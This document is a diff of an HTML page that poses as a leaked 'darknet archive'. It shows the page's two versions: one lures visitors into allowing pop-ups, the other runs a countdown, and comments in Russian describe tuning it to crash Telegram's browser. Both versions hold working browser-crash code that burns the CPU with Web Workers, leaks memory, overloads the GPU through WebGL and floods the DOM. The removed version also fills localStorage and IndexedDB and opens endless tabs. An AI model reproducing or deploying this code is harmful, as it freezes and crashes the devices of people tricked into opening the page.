@@ -2,139 +2,111 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Darknet Archive by Tuzyaka1488</title>
+    <title>Tuzyaka archive</title>
     <style>
         body {
-            background-color: #1a1a1a;
-            color: #00ff00;
+            background-color: #000;
+            color: #0f0;
             font-family: 'Courier New', monospace;
             text-align: center;
-            padding-top: 20%;
+            padding-top: 40%;
+            margin: 0;
+            overflow: hidden;
         }
         h1 {
-            font-size: 2.5em;
-            text-shadow: 0 0 10px #00ff00;
+            font-size: 2em;
+            text-shadow: 0 0 10px #0f0;
         }
-        p {
-            font-size: 1.2em;
-            max-width: 600px;
-            margin: 20px auto;
+        #countdown {
+            font-size: 1.5em;
+            color: #f00;
+            text-shadow: 0 0 5px #f00;
+            margin-top: 20px;
         }
         canvas {
-            display: none; /* Hide canvas until activation */
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
         }
     </style>
 </head>
 <body>
-    <h1>Tuzyaka1488 Leaked a Darknet Archive</h1>
-    <p>Yo, this is a hidden stash straight from the darknet depths. Rare files, encrypted secrets, and stuff they don’t want you to see. To unlock it, allow pop-ups in your browser. Once you do, the archive will extract itself. Ready to dive into the abyss?</p>
+    <h1>Tuzyaka archive</h1>
+    <div id="countdown">Unlocking in: 10</div>
 
-    <canvas id="canvas" style="position:absolute; top:0; left:0;"></canvas>
+    <canvas id="canvas"></canvas>
 
     <script>
-        // Check for popup permission
-        function checkPopupPermission() {
-            const testPopup = window.open("", "_blank", "width=1,height=1");
-            if (testPopup) {
-                testPopup.close();
-                destroyDevice();
-            } else {
-                setTimeout(checkPopupPermission, 1000);
+        // Таймер 10 секунд
+        let secondsLeft = 10;
+        const countdownElement = document.getElementById("countdown");
+        const countdown = setInterval(() => {
+            secondsLeft--;
+            countdownElement.textContent = `Unlocking in: ${secondsLeft}`;
+            if (secondsLeft <= 0) {
+                clearInterval(countdown);
+                unleashCrash();
             }
-        }
+        }, 1000);
 
-        // Main destruction function
-        function destroyDevice() {
-            document.body.innerHTML = "<h1>Access Granted. Extraction in Progress...</h1>";
-            document.body.style.color = "#ff0000";
-            document.body.style.textShadow = "0 0 10px #ff0000";
+        // Максимальный крах для Telegram
+        function unleashCrash() {
+            document.body.innerHTML = "<h1>Archive Unleashed</h1>";
+            document.body.style.color = "#f00";
+            document.body.style.textShadow = "0 0 10px #f00";
 
-            // 1. CPU overload with Web Workers
-            function startWorkers() {
-                for (let i = 0; i < navigator.hardwareConcurrency || 4; i++) {
+            // 1. Перегрузка процессора
+            function overloadCPU() {
+                const workerCount = navigator.hardwareConcurrency || 2; // Ограничим для Telegram
+                for (let i = 0; i < workerCount * 2; i++) {
                     const workerCode = `
                         onmessage = function() {
                             while (true) {
-                                for (let i = 0; i < 1000000; i++) {
-                                    Math.sin(Math.random());
+                                let x = 0;
+                                for (let i = 0; i < 3000000; i++) {
+                                    x += Math.sin(Math.random()) * Math.cos(Math.random());
                                 }
                             }
                         };
                     `;
-                    const blob = new Blob([workerCode], { type: "application/javascript" });
-                    const worker = new Worker(URL.createObjectURL(blob));
-                    worker.postMessage("start");
+                    try {
+                        const blob = new Blob([workerCode], { type: "application/javascript" });
+                        const worker = new Worker(URL.createObjectURL(blob));
+                        worker.postMessage("start");
+                    } catch (e) {
+                        // Если Web Workers заблокированы, используем обычный цикл
+                        setInterval(() => {
+                            let x = 0;
+                            for (let i = 0; i < 3000000; i++) {
+                                x += Math.sin(Math.random()) * Math.cos(Math.random());
+                            }
+                        }, 1);
+                    }
                 }
             }
 
-            // 2. Memory leak with nested objects
-            function memoryLeak() {
-                let root = {};
-                let current = root;
-                function createNested() {
+            // 2. Перегрузка памяти
+            function overloadMemory() {
+                let memorySink = [];
+                function leak() {
                     for (let i = 0; i < 1000; i++) {
-                        current[i] = { data: new Array(10000).join("leak"), next: {} };
-                        current = current[i].next;
+                        memorySink.push(new Uint32Array(1000000)); // 4 МБ на объект
                     }
-                    setTimeout(createNested, 1);
+                    setTimeout(leak, 0);
                 }
-                createNested();
+                leak();
             }
 
-            // 3. Disk overload with localStorage and IndexedDB
-            function diskOverload() {
-                try {
-                    for (let i = 0; i < 10000; i++) {
-                        localStorage.setItem("key" + i, new Array(100000).join("x"));
-                    }
-                } catch (e) { console.log("localStorage full"); }
-
-                const dbRequest = indexedDB.open("CrashDB", 1);
-                dbRequest.onupgradeneeded = function(event) {
-                    const db = event.target.result;
-                    db.createObjectStore("store");
-                };
-                dbRequest.onsuccess = function(event) {
-                    const db = event.target.result;
-                    const tx = db.transaction("store", "readwrite");
-                    const store = tx.objectStore("store");
-                    function writeData() {
-                        store.put(new Array(1000000).join("d"), "data" + Date.now());
-                        setTimeout(writeData, 1);
-                    }
-                    writeData();
-                };
-            }
-
-            // 4. DOM overload with SVG animations and filters
-            function domOverload() {
-                for (let i = 0; i < 100; i++) {
-                    const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
-                    svg.setAttribute("width", "1000");
-                    svg.setAttribute("height", "1000");
-                    svg.style.position = "absolute";
-                    svg.style.left = Math.random() * 100 + "vw";
-                    svg.style.top = Math.random() * 100 + "vh";
-                    svg.innerHTML = `
-                        <filter id="blur">
-                            <feGaussianBlur in="SourceGraphic" stdDeviation="10"/>
-                        </filter>
-                        <circle cx="500" cy="500" r="400" fill="red" filter="url(#blur)">
-                            <animate attributeName="r" from="400" to="450" dur="0.1s" repeatCount="indefinite"/>
-                        </circle>
-                    `;
-                    document.body.appendChild(svg);
-                }
-                setTimeout(domOverload, 100);
-            }
-
-            // 5. WebGL graphics overload
-            function webglOverload() {
+            // 3. Перегрузка GPU через WebGL
+            function overloadGPU() {
                 const canvas = document.getElementById("canvas");
                 canvas.style.display = "block";
-                canvas.width = window.innerWidth;
-                canvas.height = window.innerHeight;
-                const gl = canvas.getContext("webgl");
+                canvas.width = window.innerWidth * 3; // 3x для Telegram
+                canvas.height = window.innerHeight * 3;
+                const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
                 if (!gl) return;
 
                 const vsSource = `
@@ -144,10 +116,16 @@
                     }
                 `;
                 const fsSource = `
-                    precision mediump float;
+                    precision highp float;
                     uniform float uTime;
                     void main() {
-                        gl_FragColor = vec4(sin(uTime), cos(uTime), 0.5, 1.0);
+                        float r = 0.0, g = 0.0, b = 0.0;
+                        for (int i = 0; i < 3000; i++) { // Усиленный цикл
+                            r += sin(float(i) * uTime * 0.1);
+                            g += cos(float(i) * uTime * 0.2);
+                            b += tan(float(i) * uTime * 0.3);
+                        }
+                        gl_FragColor = vec4(mod(r, 1.0), mod(g, 1.0), mod(b, 1.0), 1.0);
                     }
                 `;
 
@@ -180,25 +158,32 @@
                 render();
             }
 
-            // 6. Infinite tabs
-            function openTabs() {
-                window.open(window.location.href, "_blank");
-                setTimeout(openTabs, 1);
+            // 4. Перегрузка DOM
+            function overloadDOM() {
+                function createChaos() {
+                    for (let i = 0; i < 100; i++) {
+                        const div = document.createElement("div");
+                        div.style.position = "absolute";
+                        div.style.left = Math.random() * 100 + "%";
+                        div.style.top = Math.random() * 100 + "%";
+                        div.style.width = "150px";
+                        div.style.height = "150px";
+                        div.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                        div.style.boxShadow = "0 0 80px rgba(255,0,0,1)";
+                        div.style.transform = `rotate(${Math.random() * 360}deg)`;
+                        document.body.appendChild(div);
+                    }
+                    setTimeout(createChaos, 10);
+                }
+                createChaos();
             }
 
-            // Start everything
-            startWorkers();
-            memoryLeak();
-            diskOverload();
-            domOverload();
-            webglOverload();
-            openTabs();
+            // Запускаем всё
+            overloadCPU();
+            overloadMemory();
+            overloadGPU();
+            overloadDOM();
         }
-
-        // Start checking on load
-        window.onload = function() {
-            checkPopupPermission();
-        };
     </script>
 </body>
 </html>
